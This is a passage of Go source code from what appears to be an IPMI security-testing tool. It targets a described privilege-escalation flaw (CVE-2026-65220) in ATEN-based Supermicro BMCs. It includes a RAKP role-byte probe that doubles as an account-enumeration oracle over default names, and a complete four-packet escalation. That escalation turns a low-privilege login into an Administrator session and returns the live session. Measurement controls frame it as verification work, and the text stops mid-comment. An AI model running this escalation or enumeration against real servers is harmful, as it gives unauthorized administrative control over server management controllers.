	// ReservedRejectedConformantly records that the reserved role byte was refused
	// with one of the codes a conformant handler uses, i.e. the target is not
	// affected. A refusal with some other code is recorded as a plain rejection:
	// still no finding, but not evidence of a correct role check either.
	ReservedRejectedConformantly bool `json:"reservedRejectedConformantly"`

	// Defect is the verdict: the reserved role nibble was accepted where a
	// spec-conformant handler rejects it, and the valid-role baseline proves the
	// named account resolves.
	Defect bool   `json:"defect"`
	Error  string `json:"error,omitempty"`
}

// Summary renders the probe verdict in one line.
func (p *SMCReservedRoleProbe) Summary() string {
	switch {
	case p == nil:
		return "not-probed"
	case p.Username == "":
		return "no-resolvable-account"
	case p.Defect:
		return fmt.Sprintf("reserved role 0x%02x accepted (rakp2=0x00)", p.ReservedRole)
	case p.Error != "":
		return "error"
	case !p.ConformantAccepted:
		return fmt.Sprintf("control role 0x%02x not accepted for %q (rakp2=0x%02x): a rejected reserved role would say nothing", p.ConformantRole, p.Username, p.ConformantStatus)
	default:
		return fmt.Sprintf("reserved role rejected (rakp2=0x%02x)", p.ReservedStatus)
	}
}

// RAKP1RoleStatus sends one Open Session plus one RAKP message 1 carrying the
// given role byte and username, and returns the message-2 status.
//
// This offers no credential: RAKP message 3 is never sent, so nothing is
// verified against a password and no bad-password record can be charged. On any
// stack message 2 returns 0x0d for a username that does not exist, which makes
// this an account-existence oracle as well as the role-byte probe.
func RAKP1RoleStatus(host string, port int, username string, role byte, timeout time.Duration) (byte, error) {
	c, bmcSID, _, _, err := smcOpenSessionAnySuite(host, port, 0x04, timeout)
	if err != nil {
		return 0, err
	}
	defer c.Close()
	retries := session20HandshakeRetries(timeout)

	cRand := make([]byte, 16)
	if _, err := rand.Read(cRand); err != nil {
		return 0, err
	}
	r2Resp, err := sendWithTimeoutRetry(c, buildRMCPPlus(PayloadRAKP1, 0, 0,
		smcRAKP1Body(bmcSID, cRand, role, username)), retries)
	if err != nil {
		return 0, fmt.Errorf("rakp1: %w", err)
	}
	pl, err := rmcpPlusPayload(r2Resp)
	if err != nil {
		return 0, err
	}
	if len(pl) < 2 {
		return 0, errors.New("short RAKP2")
	}
	// Best-effort release of the half-open slot. ATEN will not honor it (its Close
	// Session handler requires an active session), so this probe's cost to the
	// target is one setup slot per role lookup until the allocator reuses it.
	_ = CloseSetupSessionAsync(c, bmcSID)
	return pl[1], nil
}

// SMCReservedRoleAccountCandidates is the default account-name list for the
// CVE-2026-65220 probe. The factory Administrator name on these units is ADMIN; the
// probe only needs a name that resolves, and offers no password for it.
var SMCReservedRoleAccountCandidates = []string{"ADMIN", "admin", "root"}

// ProbeSMCReservedRole performs CVE-2026-65220 detection. It finds an account
// name that resolves, then compares how the BMC answers RAKP message 1 carrying
// a valid role byte against one carrying a reserved nibble.
//
// A conformant handler refuses a reserved role byte with 0x09 (invalid-role), 0x0a
// (unauthorized-role) or 0x12 (illegal-parameter). The affected ATEN handler
// answers 0x00 because its dispatch on the upper nibble has no default arm, and
// the arm it falls into copies the slot's existing privilege over the per-user
// clamp. Escalating from here still needs a valid low-privilege credential to sign
// message 3, so CVE-2026-65220 is an escalation rather than an authentication bypass.
func ProbeSMCReservedRole(host string, port int, preferredUser string, timeout time.Duration) (*SMCReservedRoleProbe, error) {
	probe := &SMCReservedRoleProbe{
		Host: host, Port: port,
		BaselineRole:   smcRAKP1BaselineRoleLookup,
		ConformantRole: smcRAKP1ConformantRoleLookup,
		ReservedRole:   SMCReservedRoleByte,
	}
	candidates := SMCReservedRoleAccountCandidates
	if u := strings.TrimSpace(preferredUser); u != "" {
		candidates = append([]string{u}, candidates...)
	}

	// Find a name that resolves, using the USER-level role lookup (0x12) as the
	// oracle. It has to be 0x12 and not the Administrator lookup 0x14: every account
	// that exists is entitled to USER, whereas a genuinely low-privilege account is
	// refused 0x14 with 0x0a. Resolving on 0x14 made the probe abandon a board whose
	// first resolvable candidate was not an administrator and report it clean - a
	// false negative in the detection path.
	var lastErr error
	for _, name := range candidates {
		probe.UsernameCandidates = append(probe.UsernameCandidates, name)
		st, err := RAKP1RoleStatus(host, port, name, smcRAKP1ConformantRoleLookup, timeout)
		if err != nil {
			lastErr = err
			continue
		}
		if st == 0x00 {
			probe.Username = name
			probe.ConformantStatus = st
			probe.ConformantAccepted = true
			break
		}
		// Remember the first name that at least exists (anything but "unauthorized
		// name"), but keep looking: another candidate may still give a usable control.
		if st != rakpStatusUnauthorizedName && probe.Username == "" {
			probe.Username = name
			probe.ConformantStatus = st
		}
	}
	if probe.Username == "" {
		if lastErr != nil {
			probe.Error = lastErr.Error()
			return probe, lastErr
		}
		return probe, nil
	}
	if !probe.ConformantAccepted {
		return probe, nil
	}

	// The Administrator role lookup on the resolved name. This is not the control -
	// it records whether the account can serve as the CVE-2026-65220 privilege seed.
	if st, err := RAKP1RoleStatus(host, port, probe.Username, smcRAKP1BaselineRoleLookup, timeout); err == nil {
		probe.BaselineStatus = st
		probe.BaselineAccepted = st == 0x00
	} else {
		probe.Error = err.Error()
	}

	// The probe: a reserved upper nibble.
	st, err := RAKP1RoleStatus(host, port, probe.Username, SMCReservedRoleByte, timeout)
	if err != nil {
		probe.Error = err.Error()
		return probe, nil
	}
	probe.ReservedStatus = st
	probe.ReservedAccepted = st == 0x00
	probe.ReservedRejectedConformantly = smcReservedRoleRejectedConformantly(st)
	// The control is the VALID role byte being accepted for the same name, not the
	// account being an administrator.
	probe.Defect = probe.ReservedAccepted && probe.ConformantAccepted
	return probe, nil
}

// smcReservedRoleRejectedConformantly reports whether a RAKP message-2 status is
// one of the codes a spec-conformant handler uses to refuse a role byte with
// reserved bits set.
func smcReservedRoleRejectedConformantly(status byte) bool {
	switch status {
	case rakpStatusInvalidRole, rakpStatusUnauthorizedRole, rakpStatusIllegalParameter:
		return true
	default:
		return false
	}
}

// SMCPrivWitness is one read-only, privilege-gated command measured across every
// session that gives the CVE-2026-65220 verdict its meaning.
//
// A command counts as an "Administrator witness" only if the unit under test
// actually refuses it to an Operator-privilege session. That is a firmware
// property, not a spec one - the same command can be refused to a genuine
// Administrator on one generation and granted on another - so it has to be
// measured per unit via Discriminates, against both an operator and an
// administrator control.
type SMCPrivWitness struct {
	Name  string `json:"name"`
	NetFn byte   `json:"netfn"`
	Cmd   byte   `json:"cmd"`

	BaselineCC       byte `json:"baselineCc"`
	BaselineMeasured bool `json:"baselineMeasured"`
	// OperatorCC is the lower control: the same command on a normal login as an
	// Operator-privilege account. Measured only when one is supplied.
	OperatorCC       byte `json:"operatorCc"`
	OperatorMeasured bool `json:"operatorMeasured"`
	// AdminCC is the upper reference: the same command on a normal login as a real
	// Administrator. Without it, "refused to Operator" is ambiguous between
	// Administrator-gated and simply unavailable on this firmware.
	AdminCC           byte `json:"adminCc"`
	AdminMeasured     bool `json:"adminMeasured"`
	EscalatedCC       byte `json:"escalatedCc"`
	EscalatedMeasured bool `json:"escalatedMeasured"`

	// Discriminates means this command was shown to separate Operator from
	// Administrator on this unit: refused 0xd4 to an Operator session and granted
	// 0x00 to a real Administrator session. Both halves are required.
	Discriminates bool `json:"discriminatesOperatorFromAdministrator"`
}

// smcAdminWitnessCandidates are read-only commands that are Administrator-gated in
// IPMI 2.0 and are candidates for the CVE-2026-65220 ceiling measurement. Which of them
// actually discriminates is decided per unit, by measurement, never by this list.
// Every entry is a get: nothing here changes BMC or host state.
var smcAdminWitnessCandidates = []struct {
	Name  string
	NetFn byte
	Cmd   byte
	Data  []byte
}{
	{"Get User Access", NetFnApp, CmdGetUserAccess, []byte{0x0e, 0x01}},
	{"Get User Name", NetFnApp, CmdGetUserName, []byte{0x02}},
	{"Get Channel Access (non-volatile)", NetFnApp, 0x41, []byte{0x0e, 0x40}},
	// Channel 1, not 0x0e: ATEN answers a LAN-config read addressed to "this channel"
	// with 0xcc, which is not a privilege denial - see smcWitnessDenied.
	{"Get LAN Config param 24", 0x0c, 0x02, []byte{0x01, 0x18, 0x00, 0x00}},
	{"Get PEF Config param 1", 0x04, 0x13, []byte{0x01, 0x00, 0x00}},
	{"Get Device SDR Info", 0x04, 0x20, []byte{0x01}},
}

// smcWitnessDenied reports whether a completion code is a privilege denial, which
// means exactly 0xd4 ("insufficient privilege level"). Treating any non-zero code
// as a denial is a false-positive path: 0xcc (invalid data field), 0xc1 (invalid
// command) and 0xc6 (data length) mean unsupported or misaddressed, and a command
// unsupported for everyone would otherwise be promoted to an Administrator witness
// and yield a bogus Operator ceiling.
func smcWitnessDenied(cc byte) bool { return cc == 0xd4 }

// smcLaneWitness is a command every privilege level including Callback may issue.
// It is not a privilege measurement: it separates "the escalation did not raise
// privilege" from "this account's LAN-channel IPMI-messaging bit is clear, so
// bin/ipmi_lan answers 0xd4 to everything whatever the privilege says". The two
// look identical in the privileged reads and only this one tells them apart.
var smcLaneWitness = struct {
	Name  string
	NetFn byte
	Cmd   byte
	Data  []byte
}{"Get Device ID", NetFnApp, CmdGetDeviceID, nil}

// SMCReservedRoleEscalation is the result of the CVE-2026-65220 four-packet
// escalation. It carries the measured proof and the two controls, because
// without them an escalation claim is not distinguishable from an account that
// already held the privilege.
type SMCReservedRoleEscalation struct {
	Host      string `json:"host"`
	Port      int    `json:"port"`
	LowUser   string `json:"lowUser"`
	AdminUser string `json:"adminUser"`
	// OperatorUser is the Operator-privilege control account, if one was supplied.
	// Without it the Administrator/Operator boundary cannot be established on a
	// firmware whose witness behaviour is unknown.
	OperatorUser string `json:"operatorControlUser,omitempty"`
	Role         byte   `json:"reservedRole"`

	// BaselineUserAccessCC is Get User Access measured on a NORMAL login as the
	// low-privilege account. On an affected unit with a genuinely low-privilege
	// account this is 0xd4.
	BaselineUserAccessCC  byte   `json:"baselineUserAccessCc"`
	BaselineError         string `json:"baselineError,omitempty"`
	BaselineMeasured      bool   `json:"baselineMeasured"`
	ControlConformantCC   byte   `json:"controlConformantUserAccessCc"`
	ControlConformantErr  string `json:"controlConformantError,omitempty"`
	ControlConformantDone bool   `json:"controlConformantMeasured"`
	ControlNoSeedCC       byte   `json:"controlNoSeedUserAccessCc"`
	ControlNoSeedErr      string `json:"controlNoSeedError,omitempty"`
	ControlNoSeedDone     bool   `json:"controlNoSeedMeasured"`
	OperatorControlErr    string `json:"operatorControlError,omitempty"`
	// AdminReferenceUser / AdminReferenceErr record the upper reference session, which
	// is what turns "refused to Operator" into "Administrator-gated".
	AdminReferenceUser string `json:"adminReferenceUser,omitempty"`
	AdminReferenceErr  string `json:"adminReferenceError,omitempty"`
	// OperatorAboveBaseline records that the Operator control session demonstrably
	// landed above the low-privilege baseline. Without it the control is not credible
	// and no witness derived from it may be trusted.
	OperatorAboveBaseline bool `json:"operatorControlAboveBaseline"`
	// SeedRedundant records that the no-seed control escalated too, i.e. the session
	// slot already held privilege 4 as residue from an earlier administrator session
	// and the Administrator-named message 1 was not needed on this run.
	SeedRedundant bool `json:"seedRedundant"`

	// ProofWitness names the command the escalation verdict is actually built on: the
	// first candidate the BASELINE login was refused 0xd4 and the escalated session was
	// able to issue. Hardcoding Get User Access is a false-negative path - a unit that
	// grants it at USER privilege has no baseline denial, and the escalation would be
	// reported as "not escalated" whatever it really achieved.
	ProofWitness     string `json:"proofWitness,omitempty"`
	ProofBaselineCC  byte   `json:"proofBaselineCc"`
	ProofEscalatedCC byte   `json:"proofEscalatedCc"`
	ProofMeasured    bool   `json:"proofMeasured"`

	// EscalatedUserAccessCC is the proof: Get User Access (Operator-gated) after
	// the reserved-role sequence. The privilege oracle is deliberately not the
	// proof: on this stack the level it reports does not always reflect real
	// authorization.
	EscalatedUserAccessCC byte `json:"escalatedUserAccessCc"`
	// EscalatedSDRInfoCC is Get Device SDR Info on the escalated session, kept for
	// continuity but no longer read as the Administrator witness - some generations
	// refuse it 0xd4 even to a real Administrator. See Witnesses / WitnessUsed.
	EscalatedSDRInfoCC byte `json:"escalatedSdrInfoCc"`

	// Witnesses is the per-command measurement the ceiling verdict comes from.
	Witnesses []SMCPrivWitness `json:"witnesses,omitempty"`
	// WitnessUsed names the command that decided the ceiling, or is empty when none
	// discriminated on this firmware.
	WitnessUsed string `json:"administratorWitnessUsed,omitempty"`
	// WitnessInconclusive says the Administrator/Operator boundary was not
	// established on this unit: no candidate witness separated the two, usually
	// because no Operator-privilege control account was supplied. The verdict then
	// reports administrator with this caveat rather than downgrading, since a witness
	// a real Administrator session is also refused proves nothing.
	WitnessInconclusive bool `json:"administratorWitnessInconclusive"`

	// LaneBaselineCC / LaneEscalatedCC are the low-privilege lane witness (Get Device
	// ID) on the baseline and escalated sessions. LaneClosed means the escalated
	// session cannot issue even that, which on ATEN is the signature of a CLEAR
	// LAN-channel IPMI-messaging bit for the account - a precondition failure that
	// looks exactly like "no escalation".
	LaneBaselineCC  byte `json:"laneBaselineCc"`
	LaneEscalatedCC byte `json:"laneEscalatedCc"`
	LaneClosed      bool `json:"laneClosed"`

	// LowUserMessagingKnown / LowUserMessaging report the low-privilege account's
	// LAN-channel IPMI-messaging bit, read back from the escalated session when it can
	// reach Get User Access. CVE-2026-65220 requires it SET; with it clear the escalation
	// answers 0xd4 with the defect fully present.
	LowUserMessagingKnown bool `json:"lowUserMessagingKnown"`
	LowUserMessaging      bool `json:"lowUserMessagingEnabled"`
	LowUserID             int  `json:"lowUserId,omitempty"`

	Reached   string `json:"reached"`
	Escalated bool   `json:"escalated"`
	// Inconclusive marks a run that measured nothing usable, so "not escalated" must
	// not be inferred from it.
	Inconclusive bool   `json:"inconclusive"`
	Reason       string `json:"inconclusiveReason,omitempty"`
	Error        string `json:"error,omitempty"`
}

// OpenSession20SMCReservedRole runs the CVE-2026-65220 four-packet escalation and
// returns the activated session.
//
// Packets:
//
//  1. Open Session, requested maximum privilege 4
//  2. RAKP message 1, role 0x14, username = an Administrator account  [no credential]
//  3. RAKP message 1, role 0x24 (reserved), username = the low-privilege account
//  4. RAKP message 3, authentication code over the low-privilege account's own key
//
// Step 4 signs with the caller's real password, so this is an escalation from a
// valid low-privilege account rather than an authentication bypass. The caller owns
// Close().
//
// An empty lowUser is allowed: the null/anonymous account is a distinct identity
// with its own password, framed with a zero-length username field like every other
// login path here. Only a call with neither username nor password is rejected,
// since RAKP3 would then sign nothing real.
func OpenSession20SMCReservedRole(host string, port int, lowUser, lowPass, adminUser string, role byte, timeout time.Duration) (*Session20, error) {
	if lowUser == "" && lowPass == "" {
		return nil, errors.New("smc-priv-esc: a low-privilege credential is required (the escalation signs RAKP3 with its real key)")
	}
	c, bmcSID, cSID, suite, err := smcOpenSessionAnySuite(host, port, 0x04, timeout)
	if err != nil {
		return nil, err
	}
	retries := session20HandshakeRetries(timeout)

	cRand := make([]byte, 16)
	if _, err := rand.Read(cRand); err != nil {
		c.Close()
		return nil, err
	}

	// Step 2 (optional): seed the slot's privilege bytes with 4 by naming an
	// Administrator account. No credential is used or needed. Skipping this step is
	// the "no seed" control, which must not escalate.
	if u := strings.TrimSpace(adminUser); u != "" {
		seedResp, err := sendWithTimeoutRetry(c, buildRMCPPlus(PayloadRAKP1, 0, 0,
			smcRAKP1Body(bmcSID, cRand, smcRAKP1BaselineRoleLookup, u)), retries)
		if err != nil {
			c.Close()
			return nil, fmt.Errorf("rakp1 seed: %w", err)
		}
		if pl, perr := rmcpPlusPayload(seedResp); perr == nil && len(pl) >= 2 && pl[1] != 0x00 {
			c.Close()
			return nil, fmt.Errorf("rakp1 seed for %q rejected: status=0x%02x (%s)", u, pl[1], rakpStatusText(pl[1]))
		}
	}

	// Step 3: the reserved-nibble message 1 naming the low-privilege account. Its
	// RAKP2 carries the Rc and GUID that the message-3 authentication code and the
	// session keys must be built from.
	r2Resp, err := sendWithTimeoutRetry(c, buildRMCPPlus(PayloadRAKP1, 0, 0,
		smcRAKP1Body(bmcSID, cRand, role, lowUser)), retries)
	if err != nil {
		c.Close()
		return nil, fmt.Errorf("rakp1 reserved-role: %w", err)
	}
	res := &RAKPResult{
		Username: lowUser, AuthAlgo: suite.Auth, IntegrityAlgo: suite.Integrity, ConfAlgo: suite.Conf,
		ClientSID: cSID, BMCSID: bmcSID, ClientRand: cRand,
	}
	if err := parseRAKP2(r2Resp, res); err != nil {
		c.Close()
		return nil, fmt.Errorf("rakp2: %w", err)
	}

	// Step 4: message 3 signed with the low-privilege account's real key. The role
	// byte in the transcript is the reserved one the BMC stored.
	kec := rakpKEC3ByAlgoKey(suite.Auth, []byte(lowPass), res.BMCRand, cSID, role, lowUser)
	r4Resp, err := sendWithTimeoutRetry(c, buildRMCPPlus(PayloadRAKP3, 0, 0,
		smcRAKP3Body(bmcSID, kec)), retries)
	if err != nil {
		c.Close()
		return nil, fmt.Errorf("rakp3: %w", err)
	}
	pl, err := rmcpPlusPayload(r4Resp)
	if err != nil {
		c.Close()
		return nil, err
	}
	if len(pl) < 2 {
		c.Close()
		return nil, errors.New("short RAKP4")
	}
	if pl[1] != 0x00 {
		c.Close()
		return nil, fmt.Errorf("rakp4 status=0x%02x (%s); check the low-privilege password", pl[1], rakpStatusText(pl[1]))
	}

	s := &Session20{
		client:     c,
		host:       host,
		port:       port,
		timeout:    timeout,
		cmdRetries: session20CommandRetries(timeout),
		username:   lowUser,
		password:   lowPass,
		suite:      suite,
		consoleSID: cSID,
		bmcSID:     bmcSID,
		seq:        1,
		rqSeq:      1,
	}
	s.sik, s.k1, s.k2 = deriveSessionKeysWithRole(suite.Auth, []byte(lowPass), cRand, res.BMCRand, role, lowUser)
	// CVE-2026-18450: the ATEN stack accepts cleartext in-session commands regardless of
	// the negotiated suite, and the live escalation reproduced over both. Let the
	// auto strategy pick whichever the board honors.
	s.SetCommandProtection(protectionAuto)
	return s, nil
}

// RunSMCReservedRoleEscalation runs the CVE-2026-65220 escalation with its two controls
// and proves the outcome with a privileged read rather than the privilege oracle.
//
// Controls: "no-seed" is the same reserved-role sequence without the
// Administrator-named message 1, and "conformant" is an Administrator seed plus a
// spec-conformant role lookup (0x12). Neither may escalate.
//
// Proof is Get User Access (0x06/0x44): 0xd4 to a User-privilege account on a
// normal login, 0x00 after the escalation. The ceiling is measured rather than
// assumed - a witness only decides it if the Operator control was refused it, and
// otherwise the verdict stays administrator with the witness marked inconclusive.
func RunSMCReservedRoleEscalation(host string, port int, lowUser, lowPass, adminUser string, role byte, timeout time.Duration, log func(string), opts ...SMCEscalationOption) *SMCReservedRoleEscalation {
	out := &SMCReservedRoleEscalation{Host: host, Port: port, LowUser: lowUser, AdminUser: adminUser, Role: role, Reached: "none"}
	cfg := smcEscalationConfig{}
	for _, o := range opts {
		o(&cfg)
	}
	out.OperatorUser = cfg.operatorUser
	logf := func(format string, args ...any) {
		if log != nil {
			log(fmt.Sprintf(format, args...))
		}
	}
	out.Witnesses = make([]SMCPrivWitness, 0, len(smcAdminWitnessCandidates))
	for _, w := range smcAdminWitnessCandidates {
		out.Witnesses = append(out.Witnesses, SMCPrivWitness{Name: w.Name, NetFn: w.NetFn, Cmd: w.Cmd})
	}

	// Baseline: a normal login as the low-privilege account. Without this
	// measurement the escalation claim is withheld (see SMCEscalationProven), so it
	// is worth trying every candidate suite rather than only suite 3.
	logf("smc-priv-esc: baseline login as %q", lowUser)
	if s, err := smcBaselineLogin(host, port, lowUser, lowPass, timeout); err == nil {
		for i, w := range smcAdminWitnessCandidates {
			cc, _, cerr := s.Exec(w.NetFn, w.Cmd, w.Data)
			if cerr != nil {
				if i == 0 {
					out.BaselineError = cerr.Error()
				}
				continue
			}
			out.Witnesses[i].BaselineCC = cc
			out.Witnesses[i].BaselineMeasured = true
			if i == 0 {
				out.BaselineUserAccessCC = cc
				out.BaselineMeasured = true
			}
		}
		if cc, _, cerr := s.Exec(smcLaneWitness.NetFn, smcLaneWitness.Cmd, smcLaneWitness.Data); cerr == nil {
			out.LaneBaselineCC = cc
		}
		s.Close()
	} else {
		out.BaselineError = err.Error()
	}

	// Operator control (lower bound) and Administrator reference (upper bound). Both
	// are needed before a command may be called an Administrator witness on this unit.
	if cfg.operatorUser != "" {
		logf("smc-priv-esc: operator control login as %q", cfg.operatorUser)
		if s, err := smcBaselineLogin(host, port, cfg.operatorUser, cfg.operatorPass, timeout); err == nil {
			for i, w := range smcAdminWitnessCandidates {
				if cc, _, cerr := s.Exec(w.NetFn, w.Cmd, w.Data); cerr == nil {
					out.Witnesses[i].OperatorCC = cc
					out.Witnesses[i].OperatorMeasured = true
				}
			}
			s.Close()
		} else {
			out.OperatorControlErr = err.Error()
		}
	}
	if cfg.adminPass != "" && strings.TrimSpace(adminUser) != "" {
		logf("smc-priv-esc: administrator reference login as %q", adminUser)
		if s, err := smcBaselineLogin(host, port, adminUser, cfg.adminPass, timeout); err == nil {
			out.AdminReferenceUser = adminUser
			for i, w := range smcAdminWitnessCandidates {
				if cc, _, cerr := s.Exec(w.NetFn, w.Cmd, w.Data); cerr == nil {
					out.Witnesses[i].AdminCC = cc
					out.Witnesses[i].AdminMeasured = true
				}
			}
			s.Close()
		} else {
			out.AdminReferenceErr = err.Error()
		}
	}
	// Before any witness is trusted, the Operator control has to be shown to have
	// landed ABOVE the baseline. A control session that got clamped to USER answers
	// 0xd4 to commands a real Operator is granted, which promotes them to
	// "Administrator-gated" and can manufacture an Operator ceiling - that is exactly
	// what requesting privilege 2 for the control used to do. The evidence is cheap:
	// some candidate must be refused to the baseline and granted to the control.
	for _, w := range out.Witnesses {
		if w.BaselineMeasured && smcWitnessDenied(w.BaselineCC) && w.OperatorMeasured && w.OperatorCC == 0x00 {
			out.OperatorAboveBaseline = true
			break
		}
	}
	for i := range out.Witnesses {
		w := &out.Witnesses[i]
		// Refused 0xd4 to Operator and granted to a real Administrator. Dropping the
		// second half is how Get Device SDR Info - refused to everyone on H13 FW 01.03 -
		// gets mistaken for an Administrator witness and manufactures an Operator ceiling.
		w.Discriminates = out.OperatorAboveBaseline &&
			w.OperatorMeasured && smcWitnessDenied(w.OperatorCC) &&
			w.AdminMeasured && w.AdminCC == 0x00
	}

	// Control: no Administrator seed.
	logf("smc-priv-esc: control 1 (no administrator seed)")
	if s, err := OpenSession20SMCReservedRole(host, port, lowUser, lowPass, "", role, timeout); err == nil {
		cc, _, cerr := s.Exec(NetFnApp, CmdGetUserAccess, []byte{0x0e, 0x01})
		if cerr != nil {
			out.ControlNoSeedErr = cerr.Error()
		} else {
			out.ControlNoSeedCC = cc
			out.ControlNoSeedDone = true
		}
		s.Close()
	} else {
		out.ControlNoSeedErr = err.Error()
	}

	// Control: Administrator seed with a spec-conformant role lookup.
	logf("smc-priv-esc: control 2 (administrator seed, conformant role 0x%02x)", smcRAKP1ConformantRoleLookup)
	if s, err := OpenSession20SMCReservedRole(host, port, lowUser, lowPass, adminUser, smcRAKP1ConformantRoleLookup, timeout); err == nil {
		cc, _, cerr := s.Exec(NetFnApp, CmdGetUserAccess, []byte{0x0e, 0x01})
		if cerr != nil {
			out.ControlConformantErr = cerr.Error()
		} else {
			out.ControlConformantCC = cc
			out.ControlConformantDone = true
		}
		s.Close()
	} else {
		out.ControlConformantErr = err.Error()
	}

	// The escalation.
	logf("smc-priv-esc: escalation (administrator seed %q, reserved role 0x%02x)", adminUser, role)
	s, err := OpenSession20SMCReservedRole(host, port, lowUser, lowPass, adminUser, role, timeout)
	if err != nil {
		out.Error = err.Error()
		out.Inconclusive = true
		out.Reason = "the escalation handshake itself failed, so no privilege was measured: " + err.Error()
		out.Reached = "inconclusive"
		return out
	}
	defer s.Close()
	for i, w := range smcAdminWitnessCandidates {
		cc, _, cerr := s.Exec(w.NetFn, w.Cmd, w.Data)
		if cerr != nil {
			if i == 0 {
				out.Error = cerr.Error()
			}
			continue
		}
		out.Witnesses[i].EscalatedCC = cc
		out.Witnesses[i].EscalatedMeasured = true
		if i == 0 {
			out.EscalatedUserAccessCC = cc
		}
		if w.NetFn == 0x04 && w.Cmd == 0x20 {
			out.EscalatedSDRInfoCC = cc
		}
	}
	if cc, _, cerr := s.Exec(smcLaneWitness.NetFn, smcLaneWitness.Cmd, smcLaneWitness.Data); cerr == nil {
		out.LaneEscalatedCC = cc
	}
	// The escalated session, if it reached Administrator, can read the low-privilege
	// account's own channel-access record. That is worth capturing: CVE-2026-65220 needs the
	// account's LAN IPMI-messaging bit SET, the bit reverts on `mc reset cold`, and
	// without it recorded a 0xd4 result is not attributable.
	out.LowUserID, out.LowUserMessaging, out.LowUserMessagingKnown = smcReadLowUserMessaging(s, lowUser)
	smcClassifyEscalation(out)
	return out
}

// smcEscalationConfig carries the optional inputs of the CVE-2026-65220 run.
type smcEscalationConfig struct {
	operatorUser string
	operatorPass string
	adminPass    string
}

// SMCEscalationOption configures RunSMCReservedRoleEscalation.
type SMCEscalationOption func(*smcEscalationConfig)

// WithSMCOperatorControl supplies an Operator-privilege account. It is what turns
// the Administrator claim from an assumption about the firmware into a measurement:
// a witness command counts only if this account is REFUSED it.
func WithSMCOperatorControl(user, pass string) SMCEscalationOption {
	return func(c *smcEscalationConfig) {
		c.operatorUser = strings.TrimSpace(user)
		c.operatorPass = pass
	}
}

// WithSMCAdminReference supplies the password of the Administrator account already
// named as the seed, so the witness selection can measure the UPPER bound. It is the
// other half of the proof: a command refused to an Operator only counts if a real
// Administrator is granted it, and on H13 FW 01.03 Get Device SDR Info is refused to
// both. The seed itself never needs a password; this login is only for the reference
// measurement.
func WithSMCAdminReference(pass string) SMCEscalationOption {
	return func(c *smcEscalationConfig) { c.adminPass = pass }
}

// smcReadLowUserMessaging resolves the low-privilege account's user id with Get
// User Name and reads its LAN-channel IPMI-messaging bit with Get User Access. Both
// are reads; a session that cannot issue them simply returns known=false.
func smcReadLowUserMessaging(s *Session20, lowUser string) (uid int, messaging, known bool) {
	if s == nil || strings.TrimSpace(lowUser) == "" {
		return 0, false, false
	}
	for id := 1; id <= 10; id++ {
		cc, d, err := s.Exec(NetFnApp, CmdGetUserName, []byte{byte(id)})
		if err != nil || cc != 0x00 || len(d) == 0 {
			continue
		}
		// Use the same decode as UserList: ATEN pads the 16-byte field with NULs on some
		// slots and 0xff on others, and a naive TrimRight leaves the 0xff bytes in place
		// so the name never matches.
		if !strings.EqualFold(sanitizeUserName(d), lowUser) {
			continue
		}
		cc, acc, err := s.Exec(NetFnApp, CmdGetUserAccess, []byte{0x0e, byte(id)})
		if err != nil || cc != 0x00 || len(acc) < 4 {
			return id, false, false
		}
		// Byte 4 bit 4 (0x10) is "user is enabled for IPMI messaging" on this channel,
		// matching the decode UserList already uses.
		return id, acc[3]&0x10 != 0, true
	}
	return 0, false, false
}

// smcClassifyEscalation turns the measurements into the verdict. Every arm that
// cannot support a conclusion says so rather than defaulting to "not escalated" or
// to the lower privilege.
func smcClassifyEscalation(e *SMCReservedRoleEscalation) {
	if e == nil {
		return
	}
	smcSelectProofWitness(e)
	e.Escalated = SMCEscalationProven(e)
	// A closed command lane is a PRECONDITION failure, not a negative result: the
	// account's LAN-channel IPMI-messaging bit is clear, so bin/ipmi_lan answers 0xd4
	// to everything the session sends whatever its privilege byte says.
	e.LaneClosed = e.LaneBaselineCC == 0x00 && e.LaneEscalatedCC == 0xd4
	switch {
	case e.LaneClosed:
		e.Inconclusive = true
		e.Reached = "inconclusive"
		e.Reason = fmt.Sprintf("the escalated session's command lane is closed: %s was granted 0x00 on the baseline login and refused 0x%02x after the escalation. That is what a CLEAR LAN-channel IPMI-messaging bit for this account looks like on ATEN, and it hides the defect rather than disproving it. Check `channel getaccess <ch> <id>` and re-set it - a user-record write reverts on `mc reset cold`", smcLaneWitness.Name, e.LaneEscalatedCC)
	case !e.BaselineMeasured:
		e.Inconclusive = true
		e.Reached = "inconclusive"
		e.Reason = "the baseline login as the low-privilege account could not be measured, so a privileged read after the escalation proves nothing about a CHANGE in privilege: " + e.BaselineError
	case !e.ProofMeasured:
		e.Inconclusive = true
		e.Reached = "inconclusive"
		e.Reason = "no candidate read was refused 0xd4 to the baseline login AND measurable on the escalated session, so there is no privilege change to demonstrate: either the account is not low-privilege (it was granted every candidate on a normal login) or none of the candidates is privilege-gated on this firmware. Provision a USER-privilege account and re-run"
	case !e.Escalated:
		e.Reached = "none"
	default:
		e.Reached, e.WitnessUsed, e.WitnessInconclusive = smcEscalationCeiling(e.Witnesses)
	}
	// The no-seed control escalating is not a tool failure and does not weaken the
	// finding, but it means the Administrator-named message 1 was not what supplied the
	// privilege: the reserved arm copies the slot's existing privilege byte, and a slot
	// a previous administrator session ran on already holds 4. Say so rather than
	// letting the report claim both controls came back clean.
	e.SeedRedundant = e.ControlNoSeedDone && e.ControlNoSeedCC == 0x00 && e.EscalatedUserAccessCC == 0x00
}

// smcEscalationCeiling picks the ceiling from the witness measurements. A witness
// counts only when an Operator-privilege session was measured to be refused it; with
// no such witness the ceiling is reported as administrator with a caveat, since
// reading a witness that even a real Administrator is refused as "reached only
// operator" would be wrong.
func smcEscalationCeiling(ws []SMCPrivWitness) (reached, used string, inconclusive bool) {
	for _, w := range ws {
		if !w.Discriminates || !w.EscalatedMeasured {
			continue
		}
		if w.EscalatedCC == 0x00 {
			return "administrator", w.Name, false
		}
	}
	for _, w := range ws {
		// Proven Administrator-gated on this unit and refused to the escalated session
		// for privilege: a genuine Operator ceiling. The refusal has to be 0xd4 - a 0xcc
		// or 0xc1 means the command was not answered on privilege grounds and says
		// nothing about the ceiling (H13 FW 01.03 answers a LAN-config read 0xcc).
		if w.Discriminates && w.EscalatedMeasured && smcWitnessDenied(w.EscalatedCC) {
			return "operator", w.Name, false
		}
	}
	// Nothing discriminated. Which of the two reasons it was matters, because they
	// support different statements.
	for _, w := range ws {
		if w.OperatorMeasured && w.AdminMeasured {
			// An Operator control WAS measured and was granted every candidate, so this
			// firmware does not separate Operator from Administrator by any read available
			// here. Measured on H13 FW 01.03: an Operator session is granted Get User Access
			// and Get User Name, and a real ADMIN session is refused Get Device SDR Info. The
